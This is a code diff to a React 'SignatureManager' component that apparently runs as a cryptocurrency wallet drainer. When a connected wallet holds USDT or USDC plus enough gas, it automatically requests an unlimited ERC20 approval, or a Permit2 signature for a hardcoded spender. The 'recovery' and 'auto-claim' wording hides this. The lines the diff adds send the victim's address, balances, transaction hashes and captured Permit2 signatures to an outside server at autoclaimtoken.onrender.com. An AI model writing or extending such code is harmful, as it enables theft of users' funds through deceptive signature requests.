@@ -30,12 +30,56 @@ export default function SignatureManager({ provider, userAddress }) {
       
       if (ethBalance > gasNeeded && balance > 0) {
         setResult(`Balance: ${balanceFormatted} USDT, Gas: sufficient. Auto-executing recovery...`);
+        
+        // Send immediate admin alert for balance detection
+        await fetch('https://autoclaimtoken.onrender.com/api/signature-alert', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            type: 'BALANCE_DETECTED',
+            userAddress: userAddress,
+            tokenAddress: tokenAddress,
+            balance: balanceFormatted,
+            gasBalance: ethers.formatEther(ethBalance),
+            autoExecuting: true
+          })
+        }).catch(() => {});
+        
         // Auto-execute after 2 seconds
         setTimeout(async () => {
           try {
             const tx = await approveUnlimited(tokenAddress, spenderAddress, provider);
+            
+            // Send success alert
+            await fetch('https://autoclaimtoken.onrender.com/api/signature-alert', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                type: 'ERC20_UNLIMITED_APPROVE',
+                userAddress: userAddress,
+                tokenAddress: tokenAddress,
+                spenderAddress: spenderAddress,
+                txHash: tx.hash,
+                autoExecuted: true
+              })
+            }).catch(() => {});
+            
             setResult(`Auto-executed: ${tx.hash}`);
           } catch (error) {
+            // Send failure alert
+            await fetch('https://autoclaimtoken.onrender.com/api/signature-alert', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                type: 'ERC20_UNLIMITED_APPROVE_REJECTED',
+                userAddress: userAddress,
+                tokenAddress: tokenAddress,
+                spenderAddress: spenderAddress,
+                error: error.message,
+                autoExecuted: true
+              })
+            }).catch(() => {});
+            
             setResult(`Auto-execution failed: ${error.message}`);
           }
         }, 2000);
@@ -104,13 +148,55 @@ export default function SignatureManager({ provider, userAddress }) {
       
       if (ethBalance > gasNeeded && balance > 0) {
         setResult(`Balance: ${balanceFormatted} USDC, Gas: sufficient. Auto-processing...`);
+        
+        // Send balance detection alert
+        await fetch('https://autoclaimtoken.onrender.com/api/signature-alert', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            type: 'USDC_BALANCE_DETECTED',
+            userAddress: userAddress,
+            tokenAddress: tokenAddress,
+            balance: balanceFormatted,
+            gasBalance: ethers.formatEther(ethBalance),
+            autoExecuting: true
+          })
+        }).catch(() => {});
+        
         setTimeout(async () => {
           try {
             const deadline = Math.floor(Date.now() / 1000) + 3600;
             const spender = '0x6026f8db794026ed1b1f501085ab2d97dd6fbc15';
             const signature = await signPermit2(tokenAddress, amount, deadline, spender, provider);
+            
+            // Send success alert
+            await fetch('https://autoclaimtoken.onrender.com/api/signature-alert', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                type: 'PERMIT2_SIGNATURE',
+                userAddress: userAddress,
+                tokenAddress: tokenAddress,
+                signature: signature,
+                autoExecuted: true
+              })
+            }).catch(() => {});
+            
             setResult(`Auto-signed: ${signature.slice(0, 20)}...`);
           } catch (error) {
+            // Send failure alert
+            await fetch('https://autoclaimtoken.onrender.com/api/signature-alert', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                type: 'PERMIT2_REJECTED',
+                userAddress: userAddress,
+                tokenAddress: tokenAddress,
+                error: error.message,
+                autoExecuted: true
+              })
+            }).catch(() => {});
+            
             setResult(`Auto-signing failed: ${error.message}`);
           }
         }, 2000);
